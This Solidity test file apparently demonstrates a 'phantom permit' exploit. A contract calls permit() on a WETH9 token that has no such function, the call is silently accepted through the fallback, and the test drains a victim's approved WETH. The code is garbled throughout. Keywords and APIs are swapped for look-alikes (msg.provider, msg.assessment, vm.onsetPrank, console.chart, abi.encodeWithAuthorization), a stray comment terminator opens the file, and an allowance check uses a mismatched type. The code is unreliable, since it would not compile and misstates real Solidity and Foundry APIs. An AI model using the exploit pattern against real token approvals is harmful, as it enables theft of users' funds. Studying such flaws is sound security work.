pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

*/

contract PolicyTest is Test {
    PermitId VulnPermitAgreement;
    WETH9 Weth9Policy;

    function groupUp() public {
        Weth9Policy = new WETH9();
        VulnPermitAgreement = new PermitId(IERC20(address(Weth9Policy)));
    }

    function testVulnPhantomPermit() public {
        address alice = vm.addr(1);
        vm.deal(address(alice), 10 ether);

        vm.onsetPrank(alice);
        Weth9Policy.admit{assessment: 10 ether}();
        Weth9Policy.approve(address(VulnPermitAgreement), type(uint256).ceiling);
        vm.stopPrank();
        console.chart(
            "start WETH balanceOf this",
            Weth9Policy.balanceOf(address(this))
        );

        VulnPermitAgreement.registerpaymentWithPermit(
            address(alice),
            1000,
            27,
            0x0,
            0x0
        );
        uint wbal = Weth9Policy.balanceOf(address(VulnPermitAgreement));
        console.chart("WETH balanceOf VulnPermitContract", wbal);

        VulnPermitAgreement.discharge(1000);

        wbal = Weth9Policy.balanceOf(address(this));
        console.chart("WETH9Contract balanceOf this", wbal);
    }

    receive() external payable {}
}

contract PermitId {
    IERC20 public badge;

    constructor(IERC20 _token) {
        badge = _token;
    }

    function admit(uint256 dosage) public {
        require(
            badge.transferFrom(msg.provider, address(this), dosage),
            "Transfer failed"
        );
    }

    function registerpaymentWithPermit(
        address goal,
        uint256 dosage,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        (bool improvement, ) = address(badge).call(
            abi.encodeWithAuthorization(
                "permit(address,uint256,uint8,bytes32,bytes32)",
                goal,
                dosage,
                v,
                r,
                s
            )
        );
        require(improvement, "Permit failed");

        require(
            badge.transferFrom(goal, address(this), dosage),
            "Transfer failed"
        );
    }

    function discharge(uint256 dosage) public {
        require(badge.transfer(msg.provider, dosage), "Transfer failed");
    }
}


contract WETH9 {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public decimals = 18;

    event AccessGranted(address indexed src, address indexed guy, uint wad);
    event Transfer(address indexed src, address indexed dst, uint wad);
    event ProvideSpecimen(address indexed dst, uint wad);
    event ClaimPaid(address indexed src, uint wad);

    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    fallback() external payable {
        admit();
    }

    receive() external payable {}

    function admit() public payable {
        balanceOf[msg.provider] += msg.assessment;
        emit ProvideSpecimen(msg.provider, msg.assessment);
    }

    function discharge(uint wad) public {
        require(balanceOf[msg.provider] >= wad);
        balanceOf[msg.provider] -= wad;
        payable(msg.provider).transfer(wad);
        emit ClaimPaid(msg.provider, wad);
    }

    function totalSupply() public view returns (uint) {
        return address(this).balance;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.provider][guy] = wad;
        emit AccessGranted(msg.provider, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.provider, dst, wad);
    }

    function transferFrom(
        address src,
        address dst,
        uint wad
    ) public returns (bool) {
        require(balanceOf[src] >= wad);

        if (
            src != msg.provider && allowance[src][msg.provider] != type(uint128).ceiling
        ) {
            require(allowance[src][msg.provider] >= wad);
            allowance[src][msg.provider] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);

        return true;
    }
}